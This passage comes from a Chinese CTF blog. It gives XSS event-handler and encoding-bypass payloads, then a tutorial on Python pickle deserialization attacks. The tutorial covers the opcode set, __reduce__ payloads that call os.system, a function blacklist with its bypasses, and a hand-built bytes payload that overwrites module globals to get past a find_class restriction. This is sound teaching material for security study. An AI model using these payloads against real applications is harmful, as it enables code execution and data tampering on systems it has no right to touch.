&lt;<span class="selector-tag">button</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">button</span>&gt;
&lt;<span class="selector-tag">button</span> onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">button</span>&gt;</code></pre>

<h3 id="-6"><a href="#-6" class="headerlink" title="&lt;div&gt;"></a><code>&lt;div&gt;</code></h3><p>html当中常规的切割元素，但是需要urlcode来进行绕过</p>
<pre><code class="highlight css">原代码：
&lt;<span class="selector-tag">div</span> onmouseover=&#x27;alert(<span class="number">1</span>)&#x27;&gt;<span class="selector-tag">DIV</span>&lt;/<span class="selector-tag">div</span>&gt;
经过url编码：
&lt;<span class="selector-tag">div</span> onmouseover%<span class="number">3</span>d&#x27;alert%<span class="number">26</span>lpar%<span class="number">3</span>b1%<span class="number">26</span>rpar%<span class="number">3</span>b&#x27;&gt;<span class="selector-tag">DIV</span>&lt;%<span class="number">2</span>fdiv&gt;</code></pre>

<h3 id="-7"><a href="#-7" class="headerlink" title="&lt;object&gt;"></a><code>&lt;object&gt;</code></h3><p>嵌入对象元素，引入一个外部资源</p>
<p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">object</span> data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/<span class="selector-tag">object</span>&gt;</code></pre>

<h3 id="-8"><a href="#-8" class="headerlink" title="&lt;p&gt; "></a><code>&lt;p&gt; </code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">p</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
&lt;<span class="selector-tag">p</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
&lt;<span class="selector-tag">p</span> onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;
&lt;<span class="selector-tag">p</span> onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/<span class="selector-tag">p</span>&gt;</code></pre>

<h3 id="-9"><a href="#-9" class="headerlink" title="&lt;input&gt;"></a><code>&lt;input&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">input</span> onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">input</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;
&lt;<span class="selector-tag">input</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;
&lt;<span class="selector-tag">input</span> type=&quot;<span class="selector-tag">text</span>&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">input</span>&gt;</code></pre>

<h3 id="-10"><a href="#-10" class="headerlink" title="&lt;details&gt;"></a><code>&lt;details</code>&gt;</h3><pre><code class="highlight css">&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;
&lt;<span class="selector-tag">details</span> ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/<span class="selector-tag">details</span>&gt;</code></pre>

<h3 id="-11"><a href="#-11" class="headerlink" title="&lt;select&gt;"></a><code>&lt;select&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">select</span> onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/<span class="selector-tag">select</span>&gt;
&lt;<span class="selector-tag">select</span> onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">select</span>&gt;
&lt;<span class="selector-tag">select</span> onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/<span class="selector-tag">select</span>&gt;</code></pre>

<h3 id="-12"><a href="#-12" class="headerlink" title="&lt;form&gt;"></a><code>&lt;form&gt;</code></h3><p>表单元素</p>
<pre><code class="highlight css">&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt; 
&lt;<span class="selector-tag">form</span> method=&quot;<span class="attribute">x</span>&quot; action=&quot;<span class="attribute">x</span>&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;<span class="selector-tag">input</span> type=submit&gt;&lt;/<span class="selector-tag">form</span>&gt;</code></pre>

<h3 id="-13"><a href="#-13" class="headerlink" title="&lt;body&gt;"></a><code>&lt;body&gt;</code></h3><pre><code class="highlight css">&lt;<span class="selector-tag">body</span> onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/<span class="selector-tag">body</span>&gt;</code></pre>



















]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>随手打的pickle反序列化</title>
    <url>/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Pickle反序列化的利用"><a href="#Pickle反序列化的利用" class="headerlink" title="Pickle反序列化的利用"></a>Pickle反序列化的利用</h1><h2 id="pickle是什么，能吃吗"><a href="#pickle是什么，能吃吗" class="headerlink" title="pickle是什么，能吃吗"></a>pickle是什么，能吃吗</h2><p>pickle虽说是和python有点关系，但是不如说它更像一门单独的语言</p>
<p>既然要讲反序列化，那就先讲讲用于反序列化的函数</p>
<pre><code class="highlight plaintext">pickle.dump()//序列化
pickle.load()//反序列化
pickle.dumps()
pickle.loads()</code></pre>

<p>先写个实例来大致了解一下这个东东</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	task=<span class="string">&#x27;ctf&#x27;</span>
	sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>

<p>可以看到打印出了这样一串<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513135736987.png" alt="image-20250513135736987"></p>
<p>但是仔细一看，不太对，我的114514怎么被吞了</p>
<p>发现需要写一个函数来处理，重新写一下</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513140625824.png" alt="image-20250513140625824"></p>
<p>真不赖吧。。</p>
<p>当然你也可以这样写</p>
<pre><code class="highlight python"><span class="keyword">import</span> os, pickle
<span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):
    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):
        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))
    
<span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))<span class="comment">#这边protocol是控制协议版本的，我们最常用的即是0的版本</span></code></pre>



<h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p><del>是Plant VS Mamba吗</del></p>
<p>pickle是一种栈语言，基于一个轻量级的PVM</p>
<p>PVM由三个部分组成:</p>
<pre><code class="highlight plaintext">指令处理器
从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。
最终留在栈顶的值将被作为反序列化对象返回。

stack
由 Python 的 list 实现，被用来临时存储数据、参数以及对象。

memo
由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储</code></pre>

<p>飞个指令集<del>不用全看，反正很多用不到也看不懂</del>，可以仔细看看</p>
<pre><code class="highlight plaintext">MARK           = b&#x27;(&#x27;   # push special markobject on stack
STOP           = b&#x27;.&#x27;   # every pickle ends with STOP
POP            = b&#x27;0&#x27;   # discard topmost stack item
POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject
DUP            = b&#x27;2&#x27;   # duplicate top stack item
FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument
INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument
BININT         = b&#x27;J&#x27;   # push four-byte signed int
BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int
LONG           = b&#x27;L&#x27;   # push long; decimal string argument
BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int
NONE           = b&#x27;N&#x27;   # push None
PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg
BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack
STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument
BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument
SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument
BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
APPEND         = b&#x27;a&#x27;   # append stack top to list below it
BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()
GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args
DICT           = b&#x27;d&#x27;   # build a dict from stack items
EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict
APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice
GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg
BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
INST           = b&#x27;i&#x27;   # build &amp; push class instance
LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg
LIST           = b&#x27;l&#x27;   # build list from topmost stack items
EMPTY_LIST     = b&#x27;]&#x27;   # push empty list
OBJ            = b&#x27;o&#x27;   # build &amp; push class instance
PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg
BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict
TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items
EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple
SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs
BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding

TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py
FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</code></pre>

<p>常用的其实就下面几种，仔细介绍一下</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody></table>
<p>来个实例</p>
<p>而这些指令集就是组成opcode的关键</p>
<p>比如下面这段示例代码</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
os.system(<span class="string">&#x27;ls&#x27;</span>)</code></pre>

<p>用opcode表示可以这样表示</p>
<pre><code class="highlight plaintext">cos 
system #引入os.sysytem,压入栈
(S&#x27;ls&#x27; #压入一个MARK，再压入字符串ls
tR. #t把最后一个MARK处的元素包装成元组入栈
#R把元组作为os.system的参数，最后.运行</code></pre>

<p>这边给两个工具帮助我们调试</p>
<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a><strong>pickletools</strong></h3><p>pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种</p>
<p>还是用上面那个代码，但是最后一行加一个<code>pickletools.dis(pickle.dumps(x))</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513145648001.png" alt="image-20250513145648001"></p>
<p>简单易懂对吧</p>
<p>但是实际上这种写法是还可以再简化的，因为我们实际上可以<strong>把不必要的<code>PUT</code>指令给删除掉。</strong>这个<code>PUT</code>意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个class并不需要这个操作，可以省略掉这些<code>PUT</code>指令。</p>
<p>使用<code>pickletools.optimize</code>来简化，删去不需要的BINPUT操作</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">import</span> pickletools
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))
y=pickletools.optimize(pickle.dumps(x))
pickletools.dis(y)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513150109996.png" alt="image-20250513150109996"></p>
<p>可以看到，确实简化了不少</p>
<p> PS: 使用<code>pickletools.dis</code>分析一个字符串时，如果<code>.</code>执行完毕之后栈里面还有东西，会抛出一个错误；而<code>pickle.loads</code>没有这么严格的检查——它会正常结束。大家应该都知道反序列化字符串的拼接吧。（不知道可以去看看BUUCTF的piapiapia这道题）。通过这种方式我们就有可能实现反序列化字符串的拼接。</p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="万恶之源–-reduce-方法"><a href="#万恶之源–-reduce-方法" class="headerlink" title="万恶之源–__reduce__方法"></a>万恶之源–<code>__reduce__</code>方法</h3><p><code>__reduce__</code>对应的指令码即为R</p>
<p>它的作用如下</p>
<pre><code class="highlight plaintext">取当前栈的栈顶记为args，然后把它弹掉。
取当前栈的栈顶记为f，然后把它弹掉。
以args为参数，执行函数f，把结果压进当前栈。</code></pre>

<p>class的<code>__reduce__</code>方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了<code>R</code>指令码。 <code>f</code>要么返回字符串，要么返回一个tuple，后者对我们而言更有用。</p>
<p>　　一种很流行的攻击思路是：利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个<code>Student</code>对象。我们想构造一个字符串，它在反序列化的时候，执行<code>ls /</code>指令</p>
<p>并且只要你的序列化结果中有这个R，恶意构造就不可避免</p>
<p>要是拿PHP来类比的话，其实就和_wakeup一样，是整个反序列化某种意义上的出口</p>
<p>那我问你，那我问你，我把R禁掉了怎么办</p>
<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><h4 id="绕过函数黑名单"><a href="#绕过函数黑名单" class="headerlink" title="绕过函数黑名单"></a>绕过函数黑名单</h4><p>　有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<pre><code class="highlight text">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</code></pre>

<p>　　可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。这题死于黑名单有漏网之鱼。</p>
<p>　　另外，还有一个解（估计是出题人的预期解），那就是利用map来干这件事：</p>
<pre><code class="highlight text">class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,[&quot;ls&quot;])</code></pre>

<p>　　总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉<code>R</code>这个指令码。</p>
<h4 id="全局变量包含：c指令码的妙用"><a href="#全局变量包含：c指令码的妙用" class="headerlink" title="全局变量包含：c指令码的妙用"></a>全局变量包含：<code>c</code>指令码的妙用</h4><p>　　有这么一道题，彻底过滤了<code>R</code>指令码（写法是：只要见到payload里面有<code>R</code>这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，<strong>反序列化之后，name和grade需要与blue这个module里面的name、grade相对应</strong>。</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-b42656fa4b3c95eaee8c37dccacad636_1440w.jpg" alt="img"></p>
<p>目标是取得well done</p>
<p>　　不能用<code>R</code>指令码了，不过没关系。还记得我们的<code>c</code>指令码吗？它专门用来获取一个全局变量。我们先弄一个正常的Student来看看序列化之后的效果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-8b0cb8c071dadcde37abdce434a8f180_1440w.jpg" alt="img"></p>
<p>　　如何用<code>c</code>指令来换掉这两个字符串呢？以name的为例，只需要把硬编码的<code>rxz</code>改成从<code>blue</code>引入的<code>name</code>，写成指令就是：<code>cblue\nname\n</code>。把用于编码<code>rxz</code>的<code>X\x03\x00\x00\x00rxz</code>替换成我们的这个global指令，来看看改造之后的效果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-2a5604887f01ef88aebf6409279e82a1_1440w.jpg" alt="img"></p>
<p>load一下，发现真的引入了blue里面的变量</p>
<p>　　把这个payload进行base64编码之后传进题目，得到well done。</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d02aeb43085db59a6d4b41f88c5ea68e_1440w.jpg" alt="img"></p>
<p>　　顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。</p>
<h4 id="绕过c指令module限制：先读入，再篡改"><a href="#绕过c指令module限制：先读入，再篡改" class="headerlink" title="绕过c指令module限制：先读入，再篡改"></a>绕过<code>c</code>指令<code>module</code>限制：先读入，再篡改</h4><p>　　之前提到过，<code>c</code>指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个module，这道题又该如何解决呢？</p>
<p>　　通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<p>　　有了这个知识作为前提，我们可以干这么一件事：</p>
<ul>
<li>通过<code>__main__.blue</code>引入这一个module，由于命名空间还在main内，故不会被拦截</li>
<li>把一个dict压进栈，内容是<code>&#123;&#39;name&#39;: &#39;rua&#39;, &#39;grade&#39;: &#39;www&#39;&#125;</code></li>
<li>执行BUILD指令，会导致改写 <code>__main__.blue.name</code>和 <code>__main__.blue.grade</code> ，至此<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
<li>弹掉栈顶，现在栈变成空的</li>
<li>照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是’rua’和’www’</li>
</ul>
<p>　　由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，当然name和grade都与blue.name、blue.grade对应了——我们刚刚亲手把blue篡改掉。</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nblue\n&#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-be0b611551c62614ea92f06ffe234480_1440w.jpg" alt="img"></p>
<p>绿框区域完成了篡改</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5d923ca1b18273daec2e8131b64b8721_1440w.jpg" alt="img"></p>
<p>　　题目返回了well done，而且此时blue.grade已经变成www，可见我们真的篡改了blue.</p>
<p>所以思路就是用现成的白名单来进行RCE</p>
<h4 id="不用reduce，也能RCE"><a href="#不用reduce，也能RCE" class="headerlink" title="不用reduce，也能RCE"></a>不用reduce，也能RCE</h4><p>　　之前谈到过，<code>__reduce__</code>与<code>R</code>指令是绑定的，禁止了<code>R</code>指令就禁止了<code>__reduce__</code> 方法。那么，在禁止<code>R</code>指令的情况下，我们还能RCE吗？这就是本文研究的重点。</p>
<p>　　现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用<code>fun(arg)</code>，其中<code>fun</code>和<code>arg</code>都必须可控。</p>
<p>　　审pickle源码，来看看BUILD指令（指令码为<code>b</code>）是如何工作的：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img"></p>
<p>BUILD指令实现</p>
<p>　　这里的实现方式也就是上文的注所提到的：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__ </code>里面。</p>
